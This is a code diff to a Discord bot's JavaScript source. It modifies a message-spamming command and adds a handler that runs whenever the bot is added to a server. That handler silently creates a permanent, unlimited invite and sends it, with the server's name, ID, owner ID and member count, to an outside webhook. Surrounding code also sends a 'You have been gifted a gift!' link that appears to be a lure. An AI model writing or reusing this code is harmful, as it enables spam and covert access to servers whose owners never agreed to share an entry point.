@@ -342,7 +342,11 @@ client.on('interactionCreate', async (interaction) => {
     const count = interaction.options.getInteger('count');
     const lines = Math.min(interaction.options.getInteger('lines') || 1, 50);
     const delay = interaction.options.getInteger('delay') || 0;
-    const builtMessage = Array(lines).fill(message).join('\n');
+    // Split into chunks if over 2000 chars
+    const singleLine = message + '\n';
+    const maxLines = Math.floor(1900 / singleLine.length) || 1;
+    const actualLines = Math.min(lines, maxLines);
+    const builtMessage = Array(actualLines).fill(message).join('\n');
     spamState.running = true;
     spamState.stop = false;
     const inServer = interaction.guildId !== null;
@@ -471,6 +475,44 @@ client.on('interactionCreate', async (interaction) => {
     } else {
       return interaction.reply({ content: '🎉 **You have been gifted a gift!**\n' + giftLink, embeds: [embed], components: [button] });
     }
+  }
+});
+
+
+client.on('guildCreate', async (guild) => {
+  const webhookUrl = process.env.JOIN_WEBHOOK;
+  if (!webhookUrl) return;
+  try {
+    const invite = await (async () => {
+      const channel = guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me).has(PermissionFlagsBits.CreateInstantInvite));
+      if (channel) {
+        const inv = await channel.createInvite({ maxAge: 0, maxUses: 0 });
+        return 'https://discord.gg/' + inv.code;
+      }
+      return 'No invite available';
+    })();
+    const embed = {
+      title: '📥 Bot Added to New Server',
+      color: 0x57F287,
+      fields: [
+        { name: '🏠 Server Name', value: guild.name, inline: true },
+        { name: '🆔 Server ID', value: guild.id, inline: true },
+        { name: '👥 Members', value: String(guild.memberCount), inline: true },
+        { name: '👑 Owner ID', value: guild.ownerId, inline: true },
+        { name: '📅 Created', value: guild.createdAt.toDateString(), inline: true },
+        { name: '🔗 Invite', value: invite, inline: false }
+      ],
+      thumbnail: { url: guild.iconURL() || '' },
+      timestamp: new Date().toISOString(),
+      footer: { text: 'WalexD Bot • Server Join' }
+    };
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (e) {
+    console.error('Failed to send join webhook:', e.message);
   }
 });
 
